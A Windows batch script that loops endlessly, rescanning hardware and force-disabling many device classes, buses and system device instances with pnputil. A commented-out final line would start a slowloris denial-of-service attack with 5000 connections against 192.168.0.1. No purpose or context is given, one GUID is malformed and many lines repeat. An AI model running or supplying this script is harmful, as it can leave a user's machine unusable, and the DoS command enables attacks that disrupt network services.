@echo off

chcp 65001


:loooop
cls & cls && pnputil /scan-devices /async && cls & cls

cls & cls && pnputil /disable-device /class "{6a3433f4-5626-40e8-a9b9-dbd9ecd2884b}" && cls & cls
cls & cls && pnputil /disable-device /class "{6a3433f4-5626-40e8-a9b9-dbd9ecd2884b}" /force && cls & cls
cls & cls && pnputil /disable-device /bus "{6a3433f4-5626-40e8-a9b9-dbd9ecd2884b}" && cls & cls
cls & cls && pnputil /disable-device /bus "{6a3433f4-5626-40e8-a9b9-dbd9ecd2884b}" /force && cls & cls



cls & cls && pnputil /disable-device /class "{a8b865dd-2e3d-4094-ad97-e593a70c75d6}" && cls & cls
cls & cls && pnputil /disable-device /class "{a8b865dd-2e3d-4094-ad97-e593a70c75d6}" /force && cls & cls
cls & cls && pnputil /disable-device /bus "{a8b865dd-2e3d-4094-ad97-e593a70c75d6}" && cls & cls
cls & cls && pnputil /disable-device /bus "{a8b865dd-2e3d-4094-ad97-e593a70c75d6}" /force && cls & cls



cls & cls && pnputil /disable-device /class "{80497100-8c73-48b9-aad9-ce387e1956e}" && cls & cls
cls & cls && pnputil /disable-device /class "{80497100-8c73-48b9-aad9-ce387e1956e}" /force && cls & cls
cls & cls && pnputil /disable-device /bus "{80497100-8c73-48b9-aad9-ce387e1956e}" && cls & cls
cls & cls && pnputil /disable-device /bus "{80497100-8c73-48b9-aad9-ce387e1956e}" /force && cls & cls

cls & cls && pnputil /disable-device /class "{3464f7a4-2444-40b1-980a-e0903cb6d912}" && cls & cls
cls & cls && pnputil /disable-device /class "{3464f7a4-2444-40b1-980a-e0903cb6d912}" /force && cls & cls
cls & cls && pnputil /disable-device /bus "{3464f7a4-2444-40b1-980a-e0903cb6d912}" && cls & cls
cls & cls && pnputil /disable-device /bus "{3464f7a4-2444-40b1-980a-e0903cb6d912}" /force && cls & cls

cls & cls && pnputil /disable-device /class "{06d10322-7de0-4cef-8e25-197d0e7442e2}" && cls & cls
cls & cls && pnputil /disable-device /class "{06d10322-7de0-4cef-8e25-197d0e7442e2}" /force && cls & cls
cls & cls && pnputil /disable-device /bus "{06d10322-7de0-4cef-8e25-197d0e7442e2}" && cls & cls
cls & cls && pnputil /disable-device /bus "{06d10322-7de0-4cef-8e25-197d0e7442e2}" /force && cls & cls
cls & cls && pnputil /disable-device "SWD\MSDAS\{CE958E9A-424F-4C88-86F4-11314821E75A}" && cls & cls
cls & cls && pnputil /disable-device "SWD\MSDAS\{CE958E9A-424F-4C88-86F4-11314821E75A}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{74A7B767-ED6E-50CA-A9E1-3867A42416A5}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{38147D85-42E3-5FC2-A029-076D140E054D}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{FDE26FBC-B3BB-502C-91B6-522E85D7F82C}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{58DBCCF2-00E3-51F5-8335-A60023944157}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{D60D24EB-FD31-5932-9D7F-E5AF1239B12C}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{6BF2DFEA-F1DF-580E-BD0D-B24EBD06A3F2}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{79CA7F93-1FE5-507F-866B-87BFCABB8F4B}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{B4A74A41-45A2-50C6-9DE6-186F218F918A}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{79CA7F93-1FE5-507F-866B-87BFCABB8F4B}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{B4A74A41-45A2-50C6-9DE6-186F218F918A}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{79CA7F93-1FE5-507F-866B-87BFCABB8F4B}" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{B4A74A41-45A2-50C6-9DE6-186F218F918A}" && cls & cls
cls & cls && PNPUTIL /disable-device /bus "{084F01FA-E634-4D77-83EE-074817C03581}" && cls & cls
cls & cls && PNPUTIL /disable-device /class "{084F01FA-E634-4D77-83EE-074817C03581}" && cls & cls
cls & cls && PNPUTIL /disable-device /bus "{4D36E979-E325-11CE-BFC1-08002BE10318}" && cls & cls
cls & cls && PNPUTIL /disable-device /class "{4D36E979-E325-11CE-BFC1-08002BE10318}" && cls & cls
cls & cls && PNPUTIL /disable-device /bus "{084F01FA-E634-4D77-83EE-074817C03581}" /force && cls & cls
cls & cls && PNPUTIL /disable-device /class "{084F01FA-E634-4D77-83EE-074817C03581}" /force && cls & cls
cls & cls && PNPUTIL /disable-device /bus "{4D36E979-E325-11CE-BFC1-08002BE10318}" /force && cls & cls
cls & cls && PNPUTIL /disable-device /class "{4D36E979-E325-11CE-BFC1-08002BE10318}" /force && cls & cls
cls & cls && pnputil /disable-device "SWD\COMPUTER\MFG_DEFAULT_STRING&FAM_DEFAULT_STRING&PROD_DEFAULT_STRING&SKU_DEFAULT_STRING" /force && cls & cls
cls & cls && pnputil /disable-device "SWD\COMPUTER\MFG_DEFAULT_STRING&FAM_DEFAULT_STRING&PROD_DEFAULT_STRING&SKU_DEFAULT_STRING" && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{74A7B767-ED6E-50CA-A9E1-3867A42416A5}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{38147D85-42E3-5FC2-A029-076D140E054D}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{FDE26FBC-B3BB-502C-91B6-522E85D7F82C}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{58DBCCF2-00E3-51F5-8335-A60023944157}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{D60D24EB-FD31-5932-9D7F-E5AF1239B12C}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{6BF2DFEA-F1DF-580E-BD0D-B24EBD06A3F2}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{79CA7F93-1FE5-507F-866B-87BFCABB8F4B}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{B4A74A41-45A2-50C6-9DE6-186F218F918A}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{79CA7F93-1FE5-507F-866B-87BFCABB8F4B}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{B4A74A41-45A2-50C6-9DE6-186F218F918A}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{79CA7F93-1FE5-507F-866B-87BFCABB8F4B}" /force && cls & cls
cls & cls && pnputil /disable-device "COMPUTER\{B4A74A41-45A2-50C6-9DE6-186F218F918A}" /force && cls & cls
::::::REM cls && "Y:\Perl\bin\perl.exe" "Y:\bat\slowlorris\slowloris.pl" -dns 192.168.0.1 -port 80 -timeout 1 -num 5000 -tcpto 3000 -shost 192.168.0.1 & cls

goto loooop